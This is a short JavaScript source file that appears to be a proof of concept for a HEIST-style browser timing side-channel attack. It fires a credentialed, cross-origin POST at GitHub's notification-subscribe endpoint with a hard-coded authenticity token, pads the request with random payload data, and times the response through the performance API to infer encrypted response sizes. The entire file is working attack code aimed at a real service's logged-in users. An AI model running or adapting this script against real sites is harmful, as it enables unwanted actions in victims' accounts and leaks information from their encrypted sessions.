function start() {
  console.log('starting...');

  var site = 'https://github.com/edwinschaap/heist/raw/gh-pages/index.html';
  site = 'https://github.com/notifications/subscribe';
  fetchUrl(site, 4000);

}

function fetchUrl(site, payloadSize) {
  var T1, T2, interval;

  console.log('Fetching '+site);
  console.log('Payload size: '+ payloadSize);
  var payload = generatePayload(payloadSize);

  site += '?'+payload;

  console.log('setting interval');
  interval = setInterval(function(){
    var entries = performance.getEntries();
    var lastEntry = entries[entries.length-1];
    if (lastEntry.name == site) {
      T2 = lastEntry.responseEnd;
      T2minT1 = T2 - T1;
      console.log(T2minT1);
      console.log('T1: '+T1+', T2: '+T2);
    }
  });

  fetch(site, {
    method: 'post',
    mode: 'no-cors',
    redirect: 'manual',
    cache: 'no-cache',
    credentials: 'include',
    body : 'utf8=%E2%9C%93&authenticity_token=6nletYfGcKgnquE9UnR9IDGq13WZb7WgAQ8XoltMyXLrcoMUdYYfopfSKtTdKT87WHzu%2BrwUEThgqFbXCjBD8A%3D%3D&repository_id=64934908&do=included&heist='+generatePayload(8000)
  })
  .then(function(result){
    T1 = performance.now();
    console.log('T1: '+T1);
    setTimeout(function(){
      console.log('clearing interval');
      clearInterval(interval);
    }, 5000);
  })
  .catch(function(e){
    console.log(e);
  });


}

function generatePayload(length){
  var r = '';
  for (var i=length; i>0; --i) {
    r += Math.random().toString(36).slice(2,3);
  }
  return r;
}
